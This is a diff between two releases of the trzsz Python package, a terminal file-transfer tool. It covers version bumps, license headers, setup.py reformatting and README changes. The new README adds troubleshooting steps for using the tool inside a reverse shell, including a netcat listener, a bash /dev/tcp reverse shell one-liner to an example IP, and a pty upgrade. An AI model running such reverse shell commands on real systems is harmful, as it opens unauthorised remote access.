# Comparing `tmp/trzsz-1.1.2.tar.gz` & `tmp/trzsz-1.1.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "trzsz-1.1.2.tar", last modified: Sun Mar 26 07:39:08 2023, max compression
+gzip compressed data, was "trzsz-1.1.3.tar", last modified: Sat Jul  8 14:07:03 2023, max compression
```

## Comparing `trzsz-1.1.2.tar` & `trzsz-1.1.3.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-03-26 07:39:08.508859 trzsz-1.1.2/
--rw-r--r--   0 runner    (1001) docker     (123)     1067 2023-03-26 07:39:03.000000 trzsz-1.1.2/LICENSE.md
--rw-r--r--   0 runner    (1001) docker     (123)     7804 2023-03-26 07:39:08.508859 trzsz-1.1.2/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)     6667 2023-03-26 07:39:03.000000 trzsz-1.1.2/README.md
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-03-26 07:39:08.508859 trzsz-1.1.2/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     3247 2023-03-26 07:39:03.000000 trzsz-1.1.2/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-03-26 07:39:08.508859 trzsz-1.1.2/trzsz/
--rw-r--r--   0 runner    (1001) docker     (123)     1105 2023-03-26 07:39:03.000000 trzsz-1.1.2/trzsz/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)     1128 2023-03-26 07:39:03.000000 trzsz-1.1.2/trzsz/__version__.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-03-26 07:39:08.508859 trzsz-1.1.2/trzsz.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     7804 2023-03-26 07:39:08.000000 trzsz-1.1.2/trzsz.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      240 2023-03-26 07:39:08.000000 trzsz-1.1.2/trzsz.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-03-26 07:39:08.000000 trzsz-1.1.2/trzsz.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-03-26 07:39:08.000000 trzsz-1.1.2/trzsz.egg-info/not-zip-safe
--rw-r--r--   0 runner    (1001) docker     (123)       65 2023-03-26 07:39:08.000000 trzsz-1.1.2/trzsz.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-03-26 07:39:08.000000 trzsz-1.1.2/trzsz.egg-info/top_level.txt
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 14:07:03.890313 trzsz-1.1.3/
+-rw-r--r--   0 runner    (1001) docker     (123)     1086 2023-07-08 14:07:00.000000 trzsz-1.1.3/LICENSE.md
+-rw-r--r--   0 runner    (1001) docker     (123)     9887 2023-07-08 14:07:03.890313 trzsz-1.1.3/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)     8750 2023-07-08 14:07:00.000000 trzsz-1.1.3/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-07-08 14:07:03.890313 trzsz-1.1.3/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     2863 2023-07-08 14:07:00.000000 trzsz-1.1.3/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 14:07:03.890313 trzsz-1.1.3/trzsz/
+-rw-r--r--   0 runner    (1001) docker     (123)     1124 2023-07-08 14:07:00.000000 trzsz-1.1.3/trzsz/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1147 2023-07-08 14:07:00.000000 trzsz-1.1.3/trzsz/__version__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-07-08 14:07:03.890313 trzsz-1.1.3/trzsz.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     9887 2023-07-08 14:07:03.000000 trzsz-1.1.3/trzsz.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      240 2023-07-08 14:07:03.000000 trzsz-1.1.3/trzsz.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-08 14:07:03.000000 trzsz-1.1.3/trzsz.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-07-08 14:07:03.000000 trzsz-1.1.3/trzsz.egg-info/not-zip-safe
+-rw-r--r--   0 runner    (1001) docker     (123)       65 2023-07-08 14:07:03.000000 trzsz-1.1.3/trzsz.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-07-08 14:07:03.000000 trzsz-1.1.3/trzsz.egg-info/top_level.txt
```

### Comparing `trzsz-1.1.2/LICENSE.md` & `trzsz-1.1.3/LICENSE.md`

 * *Files 5% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 MIT License
 
-Copyright (c) 2023 Lonny Wong
+Copyright (c) 2023 Lonny Wong <lonnywong@qq.com>
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
 in the Software without restriction, including without limitation the rights
 to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 copies of the Software, and to permit persons to whom the Software is
 furnished to do so, subject to the following conditions:
```

### Comparing `trzsz-1.1.2/PKG-INFO` & `trzsz-1.1.3/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: trzsz
-Version: 1.1.2
+Version: 1.1.3
 Summary: trzsz is a simple file transfer tools, similar to lrzsz ( rz / sz ) and compatible with tmux, which works with iTerm2 and has a nice progress bar.
 Home-page: https://trzsz.github.io
 Author: Lonny Wong
 Author-email: lonnywong@qq.com
 License: MIT License
 Keywords: trzsz trz tsz lrzsz rz sz tmux iTerm2 progressbar
 Classifier: Development Status :: 5 - Production/Stable
@@ -32,170 +32,201 @@
 
 Website: [https://trzsz.github.io](https://trzsz.github.io)
 
 [![MIT License](https://img.shields.io/badge/license-MIT-green.svg?style=flat)](https://choosealicense.com/licenses/mit/)
 [![PyPI trzsz](https://img.shields.io/pypi/v/trzsz?style=flat)](https://pypi.python.org/pypi/trzsz/)
 [![中文网站](https://img.shields.io/badge/%E4%B8%AD%E6%96%87-%E7%BD%91%E7%AB%99-blue?style=flat)](https://trzsz.github.io/cn/)
 
-
 ## Why?
 
 Considering `laptop -> hostA -> hostB -> docker -> tmux`, using `scp` or `sftp` is inconvenience.
 
 In this case, `lrzsz` ( rz / sz ) is convenient to use, but unfortunately it's not compatible with `tmux`.
 
 `tmux` is not going to support rz / sz ( [906](https://github.com/tmux/tmux/issues/906), [1439](https://github.com/tmux/tmux/issues/1439) ), and creating a new tools is much easier than patching `tmux`.
 
-
 ## Advantage
 
-* Support **tmux**, including tmux normal mode, and tmux command mode integrated with iTerm2.
-* Support **transfer directories**, `trz -d` to upload directories, `tsz -d xxx` to download xxx directories.
-* Support **Windows server**, not only can run on Windows client, but also can run on Windows ssh server.
-* Support **native terminal**, does not require terminal to support, just use `trzsz ssh x.x.x.x` to login.
-* Support **web terminal**, transfer files and directories between local and remote servers over the web.
-* Support **drag to upload**, drag and drop files and directories to the terminal to upload to the remote server.
-* Support **progress bar**, shows the current transferring file name, progress, size, speed, remaining time, etc.
-* Better **interactive experience**, shows the transfer results or errors friendly, `ctrl + c` to stop gracefully.
-
+- Support **tmux**, including tmux normal mode, and tmux command mode integrated with iTerm2.
+- Support **transfer directories**, `trz -d` to upload directories, `tsz -d xxx` to download xxx directories.
+- Support **Windows server**, not only can run on Windows client, but also can run on Windows ssh server.
+- Support **native terminal**, does not require terminal to support, just use `trzsz ssh x.x.x.x` to login.
+- Support **web terminal**, transfer files and directories between local and remote servers over the web.
+- Support **drag to upload**, drag and drop files and directories to the terminal to upload to the remote server.
+- Support **progress bar**, shows the current transferring file name, progress, size, speed, remaining time, etc.
+- Better **interactive experience**, shows the transfer results or errors friendly, `ctrl + c` to stop gracefully.
 
 ## Installation
 
 ### On the server
 
-* with Python3
+- Install [the Go version](https://github.com/trzsz/trzsz-go) ( ⭐ Recommended )
+
+  Please check the Go version installation guide: [https://github.com/trzsz/trzsz-go#installation](https://github.com/trzsz/trzsz-go#installation)
+
+- Or install with Python3
+
   ```
   sudo python3 -m pip install --upgrade trzsz
   ```
 
-* with Python2
+- Or install with Python2
+
   ```
   sudo python2 -m pip install --upgrade trzsz
   ```
 
-* with Homebrew
+- Or install with Homebrew
+
   ```
   brew update
   brew install trzsz
   ```
 
-* with Node.js
+- Or install with Node.js
   ```
   sudo npm install -g trzsz
   ```
 
-* or install trzsz written in Go
-
-  Check [https://github.com/trzsz/trzsz-go](https://github.com/trzsz/trzsz-go)
-
-
 &nbsp;&nbsp;Can be installed without `sudo`, just add the installation path ( e.g. `~/.local/bin` ) to the `PATH` environment.
 
-
 ### Supported Terminals
 
-* [iTerm2](https://iterm2.com/) -- check [the trzsz-iterm2 installation](https://trzsz.github.io/iterm2).
+- [trzsz-ssh](https://github.com/trzsz/trzsz-ssh) ( tssh ) -- simple ssh client with trzsz support ( ⭐ Recommended ).
 
-* [tabby](https://tabby.sh/) -- install the [tabby-trzsz](https://github.com/trzsz/tabby-trzsz) plugin.
+- [iTerm2](https://iterm2.com/) -- check [the trzsz-iterm2 installation](https://trzsz.github.io/iterm2).
 
-* [electerm](https://electerm.github.io/electerm/) -- upgrade to `1.19.0` or higher.
+- [tabby](https://tabby.sh/) -- install the [tabby-trzsz](https://github.com/trzsz/tabby-trzsz) plugin.
 
-* [ttyd](https://github.com/tsl0922/ttyd) -- upgrade to `1.7.3` or higher, and start with `-t enableTrzsz=true`, use `https` unless localhost.
+- [electerm](https://electerm.github.io/electerm/) -- upgrade to `1.19.0` or higher.
 
-* [trzsz-go](https://github.com/trzsz/trzsz-go) -- supports all terminals that support a local shell.
+- [ttyd](https://github.com/tsl0922/ttyd) -- upgrade to `1.7.3` or higher, and start with `-t enableTrzsz=true`, use `https` unless localhost.
 
-* [trzsz.js](https://github.com/trzsz/trzsz.js) -- making webshell in browser and electron terminal supports `trzsz`.
+- [trzsz-go](https://github.com/trzsz/trzsz-go) -- supports all terminals that support a local shell.
 
-&nbsp;&nbsp;*Does your terminal supports `trzsz` as well? Please let me know. I would love to have it on the list.*
+- [trzsz.js](https://github.com/trzsz/trzsz.js) -- making webshell in browser and electron terminal supports `trzsz`.
 
+&nbsp;&nbsp;_Does your terminal supports `trzsz` as well? Please let me know. I would love to have it on the list._
 
 ## Trzsz Manual
 
 #### `trz` upload files to the remote server
-  ```
-  usage: trz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] [path]
 
-  Receive file(s), similar to rz and compatible with tmux.
+```
+usage: trz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] [path]
 
-  positional arguments:
-    path               path to save file(s). (default: current directory)
+Receive file(s), similar to rz and compatible with tmux.
 
-  optional arguments:
-    -h, --help         show this help message and exit
-    -v, --version      show program's version number and exit
-    -q, --quiet        quiet (hide progress bar)
-    -y, --overwrite    yes, overwrite existing file(s)
-    -b, --binary       binary transfer mode, faster for binary files
-    -e, --escape       escape all known control characters
-    -d, --directory    transfer directories and files
-    -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
-    -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
-                       N <= 0 means never timeout. (default: 20)
-  ```
+positional arguments:
+  path               path to save file(s). (default: current directory)
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -v, --version      show program's version number and exit
+  -q, --quiet        quiet (hide progress bar)
+  -y, --overwrite    yes, overwrite existing file(s)
+  -b, --binary       binary transfer mode, faster for binary files
+  -e, --escape       escape all known control characters
+  -d, --directory    transfer directories and files
+  -r, --recursive    transfer directories and files, same as -d
+  -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
+  -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
+                     N <= 0 means never timeout. (default: 20)
+```
 
 #### `tsz` download files from the remote server
-  ```
-  usage: tsz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] file [file ...]
 
-  Send file(s), similar to sz and compatible with tmux.
+```
+usage: tsz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] file [file ...]
 
-  positional arguments:
-    file               file(s) to be sent
+Send file(s), similar to sz and compatible with tmux.
 
-  optional arguments:
-    -h, --help         show this help message and exit
-    -v, --version      show program's version number and exit
-    -q, --quiet        quiet (hide progress bar)
-    -y, --overwrite    yes, overwrite existing file(s)
-    -b, --binary       binary transfer mode, faster for binary files
-    -e, --escape       escape all known control characters
-    -d, --directory    transfer directories and files
-    -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
-    -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
-                       N <= 0 means never timeout. (default: 20)
-  ```
+positional arguments:
+  file               file(s) to be sent
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -v, --version      show program's version number and exit
+  -q, --quiet        quiet (hide progress bar)
+  -y, --overwrite    yes, overwrite existing file(s)
+  -b, --binary       binary transfer mode, faster for binary files
+  -e, --escape       escape all known control characters
+  -d, --directory    transfer directories and files
+  -r, --recursive    transfer directories and files, same as -d
+  -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
+  -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
+                     N <= 0 means never timeout. (default: 20)
+```
 
 #### Trouble shooting
-* If `tmux` is not running on the remote server, but on the local computer, or on a middle server.
-  * Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
-  * Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the local computer, and `alias ssh="trzsz ssh"` for convenience.
-
-* If an error occurs, and `trzsz` is hanging up.
-  * Press `control + c` to stop `trz` or `tsz` process on the server.
-  * For iTerm2 users, press `command + option + shift + r` to stop [iTerm2 Coprocesses](https://iterm2.com/documentation-coprocesses.html).
 
-* If `trz -b` binary upload fails, and login to server using `telnet` or `docker exec`.
-  * Try to escape all known control characters, e.g., `trz -eb`.
+- If `tmux` is running on the local computer.
+
+  - Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
+  - Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the local computer, use `trzsz ssh` to login after `tmux`.
+
+- If `tmux` is running on the jump server.
+
+  - Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
+  - Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the jump server, use `trzsz -r ssh` to login after `tmux`.
+
+- If an error occurs, and `trzsz` is hanging up.
+
+  - Press `control + c` to stop `trz` or `tsz` process on the server.
+  - For iTerm2 users, press `command + option + shift + r` to stop [iTerm2 Coprocesses](https://iterm2.com/documentation-coprocesses.html).
+
+- If `trz -b` binary upload fails, and login to server using `telnet` or `docker exec`.
+
+  - Try to escape all known control characters, e.g., `trz -eb`.
 
-* If `trz -b` or `tsz -b` binary transfer fails, and login to server using `expect`.
-  * Try to `export LC_CTYPE=C` before the `expect` script. e.g.:
+- If `trz -b` or `tsz -b` binary transfer fails, and login to server using `expect`.
+
+  - Try to `export LC_CTYPE=C` before the `expect` script. e.g.:
     ```
     #!/bin/sh
     export LC_CTYPE=C
     expect -c '
       spawn ssh xxx
       expect "xxx: "
       send "xxx\n"
       interact
     '
     ```
 
+- If you want to upload and download using `trz / tsz` in a reverse shell, you need to follow these steps:
+
+  - 1\. Use `tssh xxx` or `trzsz ssh xxx` to log in to the server.
+  - 2\. Execute `nc -lnv 1337` on the server, and wait for the reverse shell connection.
+  - 3\. Reverse connect to the server on the target, such as `bash -i >& /dev/tcp/192.168.0.1/1337 0>&1`.
+  - 4\. Follow these steps in the reverse shell:
+    - 4.1. Convert to an interactive shell, such as `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
+    - 4.2. Press `ctrl + z` to turn the reverse shell into background.
+    - 4.3. Execute `stty raw -echo; fg` to disable the echo of the server, and return to the reverse shell.
+    - 4.4. Press the Enter key, and the command line prompt will be displayed.
+    - 4.5. Set the terminal environment variable `export TERM=xterm-256color` ( not necessary ).
+    - 4.6. Check if there is a `TMUX` environment variable, clear it with `unset TMUX`.
+    - 4.7. Now you can use `trz / tsz` to upload and download as normal.
+  - 5\. After exiting the interactive shell, there will be no echo, type `exit` blindly to exit the reverse shell.
+  - 6\. Type `reset` blindly on the server and press Enter to reset the default settings of the terminal.
+
 ## Screenshot
 
 #### Using trzsz in iTerm2 with `text` progress bar
 
-  ![using trzsz in iTerm2 with text progress bar](https://trzsz.github.io/images/iterm2_text.gif)
-
+![using trzsz in iTerm2 with text progress bar](https://trzsz.github.io/images/iterm2_text.gif)
 
 #### Using trzsz in iTerm2 with `zenity` progress bar
 
-  ![using trzsz in iTerm2 with zenity progress bar](https://trzsz.github.io/images/iterm2_zenity.gif)
-
+![using trzsz in iTerm2 with zenity progress bar](https://trzsz.github.io/images/iterm2_zenity.gif)
 
 #### Using trzsz in tabby with `tabby-trzsz` plugin
 
-  ![using trzsz in tabby with tabby-trzsz plugin](https://trzsz.github.io/images/tabby_trzsz.gif)
-
+![using trzsz in tabby with tabby-trzsz plugin](https://trzsz.github.io/images/tabby_trzsz.gif)
 
 ## Contact
 
-Feel free to email me <lonnywong@qq.com>.
+Feel free to email the author <lonnywong@qq.com>. Welcome to join the QQ group: 318578930.
+
+Want to buy the author a drink 🍺 ?
+
+![sponsor wechat qrcode](https://trzsz.github.io/images/sponsor_wechat.jpg)
+![sponsor alipay qrcode](https://trzsz.github.io/images/sponsor_alipay.jpg)
```

### Comparing `trzsz-1.1.2/setup.py` & `trzsz-1.1.3/setup.py`

 * *Files 16% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 # MIT License
 #
-# Copyright (c) 2022 Lonny Wong
+# Copyright (c) 2023 Lonny Wong <lonnywong@qq.com>
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
@@ -19,20 +19,20 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
 import re
 from setuptools import setup
 
-version_regex = r'[ \t]*__version__[ \t]*=[ \t]*[\'"](\d+\.\d+\.\d+)[\'"]'
-with open('trzsz/__version__.py', 'r') as f:
-    version = re.search(version_regex, f.read()).group(1)
+VERSION_REGEX = r'[ \t]*__version__[ \t]*=[ \t]*[\'"](\d+\.\d+\.\d+)[\'"]'
+with open('trzsz/__version__.py', 'r') as file:
+    version = re.search(VERSION_REGEX, file.read()).group(1)
 
-with open('README.md', 'rb') as f:
-    long_description = f.read().decode('utf8')
+with open('README.md', 'rb') as file:
+    long_description = file.read().decode('utf8')
 
 classifiers = [
     'Development Status :: 5 - Production/Stable',
     'Environment :: Console',
     'Intended Audience :: Developers',
     'Intended Audience :: Science/Research',
     'Intended Audience :: System Administrators',
@@ -49,30 +49,28 @@
 ]
 
 install_requires = [
     'trzsz-libs == ' + version,
     'trzsz-svr == ' + version,
 ]
 
-extras_require = {
-    'iterm2': [ 'trzsz-iterm2 == ' + version ]
-}
+extras_require = {'iterm2': ['trzsz-iterm2 == ' + version]}
 
 setup(
-    name                            = 'trzsz',
-    version                         = version,
-    author                          = 'Lonny Wong',
-    author_email                    = 'lonnywong@qq.com',
-    packages                        = ['trzsz'],
-    long_description                = long_description,
-    long_description_content_type   = 'text/markdown',
-    url                             = 'https://trzsz.github.io',
-    install_requires                = install_requires,
-    extras_require                  = extras_require,
-    license                         = 'MIT License',
-    classifiers                     = classifiers,
-    keywords                        = 'trzsz trz tsz lrzsz rz sz tmux iTerm2 progressbar',
-    zip_safe                        = False,
-    description                     = 'trzsz is a simple file transfer tools, ' \
-                                      'similar to lrzsz ( rz / sz ) and compatible with tmux, ' \
-                                      'which works with iTerm2 and has a nice progress bar.',
+    name='trzsz',
+    version=version,
+    author='Lonny Wong',
+    author_email='lonnywong@qq.com',
+    packages=['trzsz'],
+    long_description=long_description,
+    long_description_content_type='text/markdown',
+    url='https://trzsz.github.io',
+    install_requires=install_requires,
+    extras_require=extras_require,
+    license='MIT License',
+    classifiers=classifiers,
+    keywords='trzsz trz tsz lrzsz rz sz tmux iTerm2 progressbar',
+    zip_safe=False,
+    description='trzsz is a simple file transfer tools, '
+    'similar to lrzsz ( rz / sz ) and compatible with tmux, '
+    'which works with iTerm2 and has a nice progress bar.',
 )
```

### Comparing `trzsz-1.1.2/trzsz/__init__.py` & `trzsz-1.1.3/trzsz/__init__.py`

 * *Files 10% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 # MIT License
 #
-# Copyright (c) 2021 Lonny Wong
+# Copyright (c) 2023 Lonny Wong <lonnywong@qq.com>
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
```

### Comparing `trzsz-1.1.2/trzsz/__version__.py` & `trzsz-1.1.3/trzsz/__version__.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 # MIT License
 #
-# Copyright (c) 2023 Lonny Wong
+# Copyright (c) 2023 Lonny Wong <lonnywong@qq.com>
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
@@ -16,8 +16,8 @@
 # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 # FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 # AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-__version__ = '1.1.2'
+__version__ = '1.1.3'
```

### Comparing `trzsz-1.1.2/trzsz.egg-info/PKG-INFO` & `trzsz-1.1.3/trzsz.egg-info/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: trzsz
-Version: 1.1.2
+Version: 1.1.3
 Summary: trzsz is a simple file transfer tools, similar to lrzsz ( rz / sz ) and compatible with tmux, which works with iTerm2 and has a nice progress bar.
 Home-page: https://trzsz.github.io
 Author: Lonny Wong
 Author-email: lonnywong@qq.com
 License: MIT License
 Keywords: trzsz trz tsz lrzsz rz sz tmux iTerm2 progressbar
 Classifier: Development Status :: 5 - Production/Stable
@@ -32,170 +32,201 @@
 
 Website: [https://trzsz.github.io](https://trzsz.github.io)
 
 [![MIT License](https://img.shields.io/badge/license-MIT-green.svg?style=flat)](https://choosealicense.com/licenses/mit/)
 [![PyPI trzsz](https://img.shields.io/pypi/v/trzsz?style=flat)](https://pypi.python.org/pypi/trzsz/)
 [![中文网站](https://img.shields.io/badge/%E4%B8%AD%E6%96%87-%E7%BD%91%E7%AB%99-blue?style=flat)](https://trzsz.github.io/cn/)
 
-
 ## Why?
 
 Considering `laptop -> hostA -> hostB -> docker -> tmux`, using `scp` or `sftp` is inconvenience.
 
 In this case, `lrzsz` ( rz / sz ) is convenient to use, but unfortunately it's not compatible with `tmux`.
 
 `tmux` is not going to support rz / sz ( [906](https://github.com/tmux/tmux/issues/906), [1439](https://github.com/tmux/tmux/issues/1439) ), and creating a new tools is much easier than patching `tmux`.
 
-
 ## Advantage
 
-* Support **tmux**, including tmux normal mode, and tmux command mode integrated with iTerm2.
-* Support **transfer directories**, `trz -d` to upload directories, `tsz -d xxx` to download xxx directories.
-* Support **Windows server**, not only can run on Windows client, but also can run on Windows ssh server.
-* Support **native terminal**, does not require terminal to support, just use `trzsz ssh x.x.x.x` to login.
-* Support **web terminal**, transfer files and directories between local and remote servers over the web.
-* Support **drag to upload**, drag and drop files and directories to the terminal to upload to the remote server.
-* Support **progress bar**, shows the current transferring file name, progress, size, speed, remaining time, etc.
-* Better **interactive experience**, shows the transfer results or errors friendly, `ctrl + c` to stop gracefully.
-
+- Support **tmux**, including tmux normal mode, and tmux command mode integrated with iTerm2.
+- Support **transfer directories**, `trz -d` to upload directories, `tsz -d xxx` to download xxx directories.
+- Support **Windows server**, not only can run on Windows client, but also can run on Windows ssh server.
+- Support **native terminal**, does not require terminal to support, just use `trzsz ssh x.x.x.x` to login.
+- Support **web terminal**, transfer files and directories between local and remote servers over the web.
+- Support **drag to upload**, drag and drop files and directories to the terminal to upload to the remote server.
+- Support **progress bar**, shows the current transferring file name, progress, size, speed, remaining time, etc.
+- Better **interactive experience**, shows the transfer results or errors friendly, `ctrl + c` to stop gracefully.
 
 ## Installation
 
 ### On the server
 
-* with Python3
+- Install [the Go version](https://github.com/trzsz/trzsz-go) ( ⭐ Recommended )
+
+  Please check the Go version installation guide: [https://github.com/trzsz/trzsz-go#installation](https://github.com/trzsz/trzsz-go#installation)
+
+- Or install with Python3
+
   ```
   sudo python3 -m pip install --upgrade trzsz
   ```
 
-* with Python2
+- Or install with Python2
+
   ```
   sudo python2 -m pip install --upgrade trzsz
   ```
 
-* with Homebrew
+- Or install with Homebrew
+
   ```
   brew update
   brew install trzsz
   ```
 
-* with Node.js
+- Or install with Node.js
   ```
   sudo npm install -g trzsz
   ```
 
-* or install trzsz written in Go
-
-  Check [https://github.com/trzsz/trzsz-go](https://github.com/trzsz/trzsz-go)
-
-
 &nbsp;&nbsp;Can be installed without `sudo`, just add the installation path ( e.g. `~/.local/bin` ) to the `PATH` environment.
 
-
 ### Supported Terminals
 
-* [iTerm2](https://iterm2.com/) -- check [the trzsz-iterm2 installation](https://trzsz.github.io/iterm2).
+- [trzsz-ssh](https://github.com/trzsz/trzsz-ssh) ( tssh ) -- simple ssh client with trzsz support ( ⭐ Recommended ).
 
-* [tabby](https://tabby.sh/) -- install the [tabby-trzsz](https://github.com/trzsz/tabby-trzsz) plugin.
+- [iTerm2](https://iterm2.com/) -- check [the trzsz-iterm2 installation](https://trzsz.github.io/iterm2).
 
-* [electerm](https://electerm.github.io/electerm/) -- upgrade to `1.19.0` or higher.
+- [tabby](https://tabby.sh/) -- install the [tabby-trzsz](https://github.com/trzsz/tabby-trzsz) plugin.
 
-* [ttyd](https://github.com/tsl0922/ttyd) -- upgrade to `1.7.3` or higher, and start with `-t enableTrzsz=true`, use `https` unless localhost.
+- [electerm](https://electerm.github.io/electerm/) -- upgrade to `1.19.0` or higher.
 
-* [trzsz-go](https://github.com/trzsz/trzsz-go) -- supports all terminals that support a local shell.
+- [ttyd](https://github.com/tsl0922/ttyd) -- upgrade to `1.7.3` or higher, and start with `-t enableTrzsz=true`, use `https` unless localhost.
 
-* [trzsz.js](https://github.com/trzsz/trzsz.js) -- making webshell in browser and electron terminal supports `trzsz`.
+- [trzsz-go](https://github.com/trzsz/trzsz-go) -- supports all terminals that support a local shell.
 
-&nbsp;&nbsp;*Does your terminal supports `trzsz` as well? Please let me know. I would love to have it on the list.*
+- [trzsz.js](https://github.com/trzsz/trzsz.js) -- making webshell in browser and electron terminal supports `trzsz`.
 
+&nbsp;&nbsp;_Does your terminal supports `trzsz` as well? Please let me know. I would love to have it on the list._
 
 ## Trzsz Manual
 
 #### `trz` upload files to the remote server
-  ```
-  usage: trz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] [path]
 
-  Receive file(s), similar to rz and compatible with tmux.
+```
+usage: trz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] [path]
 
-  positional arguments:
-    path               path to save file(s). (default: current directory)
+Receive file(s), similar to rz and compatible with tmux.
 
-  optional arguments:
-    -h, --help         show this help message and exit
-    -v, --version      show program's version number and exit
-    -q, --quiet        quiet (hide progress bar)
-    -y, --overwrite    yes, overwrite existing file(s)
-    -b, --binary       binary transfer mode, faster for binary files
-    -e, --escape       escape all known control characters
-    -d, --directory    transfer directories and files
-    -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
-    -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
-                       N <= 0 means never timeout. (default: 20)
-  ```
+positional arguments:
+  path               path to save file(s). (default: current directory)
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -v, --version      show program's version number and exit
+  -q, --quiet        quiet (hide progress bar)
+  -y, --overwrite    yes, overwrite existing file(s)
+  -b, --binary       binary transfer mode, faster for binary files
+  -e, --escape       escape all known control characters
+  -d, --directory    transfer directories and files
+  -r, --recursive    transfer directories and files, same as -d
+  -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
+  -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
+                     N <= 0 means never timeout. (default: 20)
+```
 
 #### `tsz` download files from the remote server
-  ```
-  usage: tsz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] file [file ...]
 
